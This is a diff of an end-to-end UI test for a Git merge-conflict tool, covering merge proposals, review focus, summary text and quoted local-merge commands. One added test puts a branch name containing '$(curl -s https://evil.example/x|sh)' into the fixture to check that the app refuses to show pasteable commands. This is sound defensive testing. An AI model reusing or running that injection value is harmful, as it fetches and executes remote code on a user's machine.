@@ -1262,6 +1262,8 @@ void app.whenReady().then(async () => {
     // The other file says why structural merge proposed nothing.
     await wait(`${block(0)}?.querySelector('.conflict-block-note')?.textContent==='Structural merge timed out.'`);
     await captureAll('structural-note');
+    await click('Try structural merge again');
+    await wait("window.conflictCalls.some(r=>r.kind==='resolve'&&r.engine==='mergiraf'&&r.path==='src/limits.ts')");
     assert.equal(await publishes(), 0);
     await click('Close');
 
@@ -1347,7 +1349,7 @@ void app.whenReady().then(async () => {
     // A file whose every conflict is Merged: Mark reviewed is the next step, and it has focus.
     await js("[...document.querySelectorAll('.conflict-files button')][1].click()");
     await wait(`${block(0)}?.dataset.bucket==='merged'`);
-    await wait("document.activeElement?.dataset.conflictPrimary==='mark-reviewed'");
+    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
     assert.match(await js<string>("document.querySelector('.conflict-footer-status').textContent"), /^1 merged in this file · 0 of 3 files reviewed$/);
     await shot('p1-all-merged', true);
     await key('j');
@@ -1363,11 +1365,12 @@ void app.whenReady().then(async () => {
     await wait(`${block(0)}?.dataset.state==='open'`);
     await click('Use the proposal');
     await wait(`${block(0)}?.dataset.bucket==='merged'`);
-    // The header keeps its layout whether "Start from Git's conflict" shows or not.
+    // The header keeps its layout whether "Start from Git's conflict" shows or not: the title and the view switch stay
+    // put. Only a narrow tools row may wrap below them.
     await js('document.querySelector(".conflict-workspace").style.width="900px"');
     const header = () =>
       js<number[]>(
-        "(()=>{const h=document.querySelector('.conflict-file-header').getBoundingClientRect();const t=document.querySelector('.conflict-file-title').getBoundingClientRect();return [h.height,t.top-h.top]})()"
+        "(()=>{const h=document.querySelector('.conflict-file-header').getBoundingClientRect();const t=document.querySelector('.conflict-file-title').getBoundingClientRect();const m=document.querySelector('.conflict-modes').getBoundingClientRect();return [t.top-h.top,t.height,m.top-h.top]})()"
       );
     const withProposals = await header();
     await shot('p1-header-proposals-900');
@@ -1388,11 +1391,53 @@ void app.whenReady().then(async () => {
     await wait(
       "document.querySelector('[data-conflict-summary]')?.textContent==='1 file has conflicts. 1 of 1 conflict is merged and checked. 1 file is ready for review.'"
     );
-    await wait("document.activeElement?.dataset.conflictPrimary==='mark-reviewed'");
+    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
+    // Focus is on Mark reviewed only when the file opened with nothing to do, or after J; never moved there by a check.
+    if (!(await js('document.activeElement?.dataset.conflictPrimary'))) await key('j');
+    assert.equal(await js('document.activeElement?.dataset.conflictPrimary'), 'mark-reviewed');
     await shot('p1-only-merged', true);
     await key('m');
     await wait("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)");
     await wait("document.querySelector('.conflict-confirm .step-card')");
+    await click('Close');
+    // A choice of yours beside a Merged conflict: never all-Merged. The result is shown before Mark reviewed, and the
+    // summary says the file waits for review with the setting on or off.
+    const twoMerged = {
+      path: 'src/two.ts',
+      base: `import { a } from './a';\n\n${two}`,
+      ours: `import { a } from './a';\nimport { b } from './b';\n\n${three}${two}`,
+      theirs: `import { a } from './a';\nimport { c } from './c';\n\n${four}${two}`,
+      original: `import { a } from './a';\n<<<<<<< feature/retry\nimport { b } from './b';\n||||||| ancestor\n=======\nimport { c } from './c';\n>>>>>>> main\n\n<<<<<<< feature/retry\n${three}||||||| ancestor\n=======\n${four}>>>>>>> main\n${two}`,
+      proposals: [imports.proposals[0], { source: 'mergiraf', text: three + four }],
+      source: 'mergiraf',
+    };
+    await js(`(()=>{
+      Object.assign(window.conflictFixture,{version:1,files:${JSON.stringify([withResult(twoMerged)])}});
+      window.conflictCalls=[];
+    })()`);
+    await open();
+    await wait(`${block(1)}?.dataset.bucket==='merged'`);
+    await js(`[...${block(1)}.querySelectorAll('button')].find(b=>b.textContent.trim()==='Undo').click()`);
+    await wait(`${block(1)}?.dataset.state==='open'`);
+    await pick(1, 'ours');
+    await wait(`${block(1)}?.dataset.state==='kept'`);
+    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='review-result'");
+    await wait("window.conflictCalls.some(r=>r.kind==='save'&&!r.resolved)");
+    await wait("document.querySelector('.conflict-save-state')?.textContent==='Saved'");
+    const reviewSentence = '1 file has conflicts. 1 of 2 conflicts are merged and checked. 1 file is ready for review.';
+    assert.equal(await js("document.querySelector('[data-conflict-summary]').textContent"), reviewSentence);
+    await key('m');
+    await wait("document.querySelector('[data-conflict-primary]')?.dataset.conflictPrimary==='mark-reviewed'");
+    assert.equal(await js("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)"), false, 'M shows the result first');
+    // Setting off: the file is not reviewed for you, and the summary still says it waits for your review.
+    const showMergedBox = "[...document.querySelectorAll('.conflict-summary label')].find(l=>l.textContent.includes('Show me every merged conflict'))?.querySelector('input')";
+    await js(`${showMergedBox}.click()`);
+    await wait(`!${showMergedBox}.checked`);
+    await new Promise((r) => setTimeout(r, 400));
+    assert.equal(await js("window.conflictCalls.some(r=>r.kind==='save'&&r.resolved)"), false, 'Not reviewed for you');
+    assert.equal(await js("document.querySelector('[data-conflict-summary]').textContent"), reviewSentence);
+    await js(`${showMergedBox}.click()`);
+    await wait(`${showMergedBox}.checked`);
     await click('Close');
     // Rename/rename: every file needs a local merge tool, says so in the header too, and says what to do.
     const unsupported = (p: string) => ({ path: p, mode: '', base: '', ours: '', theirs: '', original: '', result: '', resolved: false, source: 'manual', unsupported: 'This conflict needs a local merge tool (rename, deletion, or repository structure).' });
@@ -1410,11 +1455,19 @@ void app.whenReady().then(async () => {
     assert.equal(await js("document.querySelector('.conflict-file-title [data-status]').textContent"), 'Needs a local merge tool');
     assert.match(
       await js<string>("document.querySelector('[data-conflict-local] pre').textContent"),
-      /^git switch feature\/retry\ngit pull\ngit fetch https:\/\/github\.com\/lab\/file-delete-vs-modify\.git main\ngit merge FETCH_HEAD$/
+      /^git switch 'feature\/retry'\ngit pull\ngit fetch 'https:\/\/github\.com\/lab\/file-delete-vs-modify\.git' 'main'\ngit merge FETCH_HEAD$/
     );
     assert.ok(await exists('Copy commands'));
     await shot('p1-unsupported', true);
     await click('Close');
+    await js("window.conflictFixture.headBranch='fix$(curl -s https://evil.example/x|sh)'");
+    await open();
+    await wait('document.querySelector("[data-conflict-local-unsafe]")');
+    assert.equal(await js('!!document.querySelector("[data-conflict-local] pre")'), false, 'No commands to paste');
+    assert.equal(await exists('Copy commands'), false);
+    await shot('p1-unsupported-unsafe');
+    await click('Close');
+    await js("window.conflictFixture.headBranch='feature/retry'");
     // The confirmation with a long diff: the title and Push stay in view; the body scrolls.
     const long = Array.from({ length: 160 }, (_, i) => `export const value${i} = ${i};`);
     const confirmPatch = `diff --git a/src/retry.ts b/src/retry.ts\n--- a/src/retry.ts\n+++ b/src/retry.ts\n@@ -1,160 +1,160 @@\n${long.map((l) => `-${l}\n+${l.replace(';', ' + 1;')}`).join('\n')}\n`;
